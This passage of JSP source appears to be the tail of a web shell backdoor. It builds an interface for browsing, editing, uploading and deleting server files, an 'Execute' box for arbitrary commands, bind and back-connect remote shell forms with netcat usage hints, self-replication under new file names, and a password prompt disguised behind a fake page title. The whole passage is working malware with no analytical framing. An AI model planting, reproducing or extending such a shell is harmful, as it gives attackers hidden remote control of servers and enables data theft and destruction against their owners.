			String imglink = "<p><a href=\"?img=" + fname + "\" target=\"_blank\"><span class=\"gaul\">[ </span>view full size<span class=\"gaul\"> ]</span></a></p>";

			fcont = "<div style=\"text-align:center;width:100%;\">" + imglink + "<img width=\"800\" src=\"?img=" + fname + "\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>";

		}

		else{

			String code = htmlspecialchars(xfileopen(fname));

			fcont = "<div class=\"boxcode\">" + code.replace("\n","<br />") + "</div>";

		}



		faction = "<a href=\"?dir=" + xcleanpath(dir) + "&view=" + fname + "\">Edit</a> | <a href=\"?get=" + fname + "\">Download</a> | <a href=\"?dir=" + xcleanpath(dir) + "&del=" + fname + "\">Remove</a>";

		fview = "<a href=\"?dir=" + xcleanpath(dir) + "&properties=" + fname + "&type=text\"><span class=\"gaul\">[ </span>text<span class=\"gaul\"> ]</span></a><a href=\"?dir=" + xcleanpath(dir) + "&properties=" + fname + "&type=img\"><span class=\"gaul\">[ </span>image<span class=\"gaul\"> ]</span></a>";

	}

	String fperm = xfileperms(fname);

	String filemtime = xfilelastmodified(fname);

	result = "<div style=\"display:inline;\">" +

	"<form action=\"?\" method=\"get\" style=\"margin:0;padding:1px 8px;text-align:left;\">" +

	"<input type=\"hidden\" name=\"dir\" value=\"" + dir + "\" />" +

	"<input type=\"hidden\" name=\"oldfilename\" value=\"" + fname + "\" />" + faction + " | " +

	"<span><input style=\"width:50%;\" type=\"text\" name=\"properties\" value=\"" + fname + "\" />" +

	"&nbsp;<input style=\"width:120px\" class=\"btn\" type=\"submit\" name=\"btnRename\" value=\"Rename\" />" +

	"</span>" +

	"<div class=\"fprop\">" +

	"Size = " + fsize + "<br />" +

	"Permission = <span class=\"gaul\">( </span>" + fperm + "<span class=\"gaul\"> )</span><br />" +

	"Last Modified = <span class=\"gaul\">( </span>" + filemtime + "<span class=\"gaul\"> )</span><br />" +

	fview + "</div>" + fcont + "</form></div>";

}

else if(((request.getParameter("view")!=null) && (!request.getParameter("view").equals(""))) || ((request.getParameter("filename")!=null) && (!request.getParameter("filename").equals("")))){

	String mymsg = "";

	String pesan = "";

	String fpath = "";

	boolean dos = false;

	if((request.getParameter("save")!=null) && (!request.getParameter("save").equals(""))){

		if((request.getParameter("dos")!=null) && (request.getParameter("dos").equals("true"))){ dos = true; }

		String saveas = request.getParameter("saveas");

		BufferedWriter outs = new BufferedWriter(new FileWriter(saveas));

		StringReader text = new StringReader(request.getParameter("filesource"));

		int i;

		boolean cr = false;

		String lineend = "\n";

		if (dos) lineend = "\r\n";

		while ((i = text.read()) >= 0) {

			if (i == '\r') cr = true;

			else if (i == '\n') {

				outs.write(lineend);

				cr = false;

			}

			else if (cr) {

				outs.write(lineend);

				cr = false;

			}

			else {

				outs.write(i);

				cr = false;

			}

		}

		outs.flush();

		outs.close();



		if(is_file(saveas)) pesan = "File Saved";

		else pesan = "Failed to save file";

		mymsg = "<span style=\"float:right;\"><span class=\"gaul\">[ </span>" + pesan + "<span class=\"gaul\"> ]</span></span>";

	}

	if((request.getParameter("view")!=null) && (!request.getParameter("view").equals(""))) {

		fpath = request.getParameter("view");

		if((request.getParameter("saveas")!=null) && (!request.getParameter("saveas").equals(""))){

			fpath = request.getParameter("saveas");

		}

	}

	else fpath = xCwd + request.getParameter("filename");



	StringBuffer result_ = new StringBuffer("");;

	BufferedReader reader = new BufferedReader(new FileReader(fpath));

	int i;



	boolean cr = false;

	while ((i = reader.read()) >= 0) {

		result_.append((char) i);

		if (i == '\r') cr = true;

		else if (cr && (i == '\n')) dos = true;

		else cr = false;

	}

	reader.close();

	String doz = "";if(dos) doz="true";else doz="false";

	result = "<p style=\"padding:0;margin:0;text-align:left;\"><a href=\"?dir=" + xCwd + "&properties=" + fpath + "\">" + xfilesummary(fpath) + "</a>" + mymsg + "</p><div style=\"clear:both;margin:0;padding:0;\"></div>" +

	"<form action=\"?dir=" + xCwd + "&view=" + fpath + "\" method=\"post\">" +

	"<textarea name=\"filesource\" style=\"width:100%;height:200px;\">" + result_ + "</textarea>" +

	"<input type=\"text\" style=\"width:80%;\"  name=\"saveas\" value=\"" + fpath + "\" />" +

	"<input type=\"hidden\" style=\"width:80%;\"  name=\"dos\" value=\"" + doz + "\" />" +

	"&nbsp;<input type=\"submit\" class=\"btn\" style=\"width:120px;\" name=\"save\" value=\"Save As\" />" +

	"</form>";

}

else{

	result = xdir(xCwd);

}

//################# Finalizing #######################======================================================]

File xcfile = new File(".");

xCwd = xcfile.getCanonicalPath();

String html_title = "";

String html_head = "";

String html_body = "";

if(auth){

	String bportC = "";

	String lportC = "";

	if(request.getParameter("bportC")!=null) bportC = request.getParameter("bportC");

	else bportC = shell_fav_port;

	if(request.getParameter("lportC")!=null) lportC = request.getParameter("lportC");

	else lportC = shell_fav_port;



	html_title = shell_title + " " + xCwd;

	html_head = "<title>" + html_title + "</title>" +

"<link rel=\"SHORTCUT ICON\" href=\"" + script_name + "?img=icon\" />" + shell_style +

"<script type=\"text/javascript\">" +

"function updateInfo(boxid,typ){" +

"	if(typ == 0){" +

"		var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';	" +

"	}" +

"	else{" +

"		var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " + xServerIP + " __PORT__&quot;';	" +

"	}" +

"	var portnum = document.getElementById(boxid).value;" +

"	var hasil = pola.replace('__PORT__', portnum);" +

"	document.getElementById(boxid+'_').innerHTML = hasil;" +

"}" +

"function show(boxid){" +

"	var box = document.getElementById(boxid);" +

"	if(box.style.display != 'inline'){" +

"		document.getElementById('newfile').style.display = 'none';" +

"		document.getElementById('newfolder').style.display = 'none';" +

"		document.getElementById('newupload').style.display = 'none';" +

"		document.getElementById('newchild').style.display = 'none';" +

"		document.getElementById('newconnect').style.display = 'none';" +

"		box.style.display = 'inline';" +

"		box.focus();" +

"	}" +

"	else box.style.display = 'none';" +

"}" +

"function highlighthexdump(address){" +

"	var target = document.getElementById(address);" +

"	target.style.background = '" + shell_color + "';" +

"}" +

"function unhighlighthexdump(address){" +

"	var target = document.getElementById(address);" +

"	target.style.background = 'none';" +

"}" +

"</script>";

html_body = "<div id=\"wrapper\">" +

"<h1 onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\"  onclick=\"window.location= '?';\"><a href=\"?\">" + shell_title + "</a></h1>" +

"<div class=\"box\">" + xHeader +

"<div class=\"fpath\">" + xdrive() + xparsedir(xCwd) +

"</div>" +

"<div class=\"menu\">" +

"<a href=\"javascript:show('newfile');\"><span class=\"gaul\">[ </span> New File<span class=\"gaul\"> ]</span></a>&nbsp;" +

"<a href=\"javascript:show('newfolder');\"><span class=\"gaul\">[ </span>New Folder<span class=\"gaul\"> ]</span></a>&nbsp;" +

"<a href=\"javascript:show('newchild');\"><span class=\"gaul\">[ </span>Replicate<span class=\"gaul\"> ]</span></a>&nbsp;" +

"<a href=\"javascript:show('newupload');\"><span class=\"gaul\">[ </span>Upload<span class=\"gaul\"> ]</span></a>&nbsp;" +

"<a href=\"javascript:show('newconnect');\"><span class=\"gaul\">[ </span>BindShell<span class=\"gaul\"> ]</span></a>&nbsp;" +

"</div>" +

"<div class=\"hidden\" id=\"newconnect\">" +

"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +

"<table class=\"tblBox\" style=\"width:100%;\">" +

"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +

"<tr><td style=\"width:130px;\">BackConnect</td><td style=\"width:200px;\">" +

"Port&nbsp;<input maxlength=\"5\" id=\"backC\" onkeyup=\"updateInfo('backC',0);\" style=\"width:60px;\" type=\"text\" name=\"bportC\" value=\"" + bportC + "\" />" +

"&nbsp;<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnConnect\" value=\"Connect\" />" +

"</td>" +

"<td><span id=\"backC_\" class=\"msgcon\">example: (using netcat) run &quot;nc -l -p " + bportC + "&quot; and then press Connect</span></td>" +

"</tr>" +

"<tr><td>Listen</td><td>" +

"Port&nbsp;<input maxlength=\"5\" id=\"listenC\" onkeyup=\"updateInfo('listenC',1);\" style=\"width:60px;\" type=\"text\" name=\"lportC\" value=\"" + lportC + "\" />" +

"&nbsp;<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnListen\" value=\"Listen\" />" +

"</td>" +

"<td><span id=\"listenC_\" class=\"msgcon\">example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " + xServerIP + " " + lportC + "&quot;</span></td>" +

"</tr></table></form></div>" +

"<div class=\"hidden\" id=\"newfolder\">" +

"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +

"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +

"<table class=\"tblBox\" style=\"width:560px;\">" +

"<tr><td style=\"width:120px;\">New Foldername</td><td style=\"width:304px;\">" +

"<input style=\"width:300px;\" type=\"text\" name=\"foldername\" value=\"newfolder\" />" +

"</td><td>" +

"<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfolder\" value=\"Create\" />" +

"</td></tr></table></form></div>" +

"<div class=\"hidden\" id=\"newfile\">" +

"<form action=\"?\" method=\"get\" style=\"display:inline;margin:0;padding:0;\">" +

"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +

"<table class=\"tblBox\" style=\"width:560px;\">" +

"<tr><td style=\"width:120px;\">New Filename</td><td style=\"width:304px;\">" +

"<input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"newfile\" />" +

"</td><td>" +

"<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfile\" value=\"Create\" />" +

"</td></tr></form></table></div>" +

"<div class=\"hidden\" id=\"newupload\">" +

"<form method=\"post\" action=\"?dir=" + xCwd + "\" enctype=\"multipart/form-data\" style=\"display:inline;margin:0;padding:0;\">" +

"<table class=\"tblBox\" style=\"width:560px;\">" +

"<tr><td style=\"width:120px;\">Save as</td><td><input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"\" /></td></tr>" +

"<tr><td style=\"width:120px;\">From Url</td><td style=\"width:304px;\">" +

"<input style=\"width:300px;\" type=\"text\" name=\"fileurl\" value=\"\" />" +

"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadUrl\" value=\"Get\" /></td></tr>" +

"<tr><td style=\"width:120px;\">From Computer</td><td style=\"width:304px;\">" +

"<input style=\"width:300px;\" type=\"file\" name=\"filelocal\" />" +

"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadLocal\" value=\"Get\" />" +

"</td></tr></table></form></div>" +

"<div class=\"hidden\" id=\"newchild\">" +

"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +

"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +

"<table class=\"tblBox\" style=\"width:560px;\">" +

"<tr><td style=\"width:120px;\">New Shellname</td><td style=\"width:304px;\">" +

"<input style=\"width:300px;\" type=\"text\" name=\"childname\" value=\"" + shell_name + ".jsp\"; />" +

"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewchild\" value=\"Create\" />" +

"</td></tr></table></form></div>" +

"<div class=\"bottomwrapper\">" +

"<div class=\"cmdbox\">" +

"<form action=\"?\" method=\"get\">" +

"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +

"<table style=\"width:100%;\"><tr>" +

"<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" /></td>" +

"<td style=\"width:10%;\"><input type=\"submit\" class=\"btn\" name=\"btnCommand\" style=\"width:120px;\" value=\"Execute\" /></td></tr></table>" +

"</form>" +

"</div>" +

"<div class=\"result\" id=\"result\">" + result +

"</div></div></div></div>";

}

else {

	html_title = shell_fake_name;

	html_head = "<title>" + html_title + "</title>" + shell_style;

	html_body = "<div style=\"margin:30px;\">" +

"<div>" +

"<form action=\"?\" method=\"post\">" +

"<input id=\"cmd\" type=\"text\" name=\"passw\" value=\"\" />" +

"<input type=\"submit\" name=\"btnpasswd\" value=\"Ok\" />" +

"</form>" +

"</div>" +

"<div style=\"font-size:10px;\">" + shell_fake_name + "</div>" +

"</div>";

}

String html_onload = "";

if((request.getParameter("cmd")!=null) || (request.getParameter("passw")!=null)){

	html_onload = " onload=\"document.getElementById('cmd').focus();\"";

}

else html_onload = "";



String html_final = "<html><head>" + html_head +

"</head>" +

"<body" + html_onload + ">" +

"<div id=\"mainwrapper\">" + html_body +

"</div></body></html>";

%><% out.println(html_final.replace("\\s+"," ").trim()); %>